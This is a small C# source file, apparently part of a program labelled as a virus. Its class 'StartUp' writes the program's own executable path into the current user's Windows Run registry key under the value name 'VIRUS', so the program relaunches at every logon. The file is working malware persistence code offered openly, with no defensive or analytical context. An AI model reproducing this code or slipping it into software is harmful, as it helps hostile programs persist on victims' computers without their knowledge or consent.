using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows.Forms;

namespace Virus
{
    class StartUp
    {
        public static void AddApplicationToStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("VIRUS", "\"" + Application.ExecutablePath + "\"");
            }
        }
    }
}
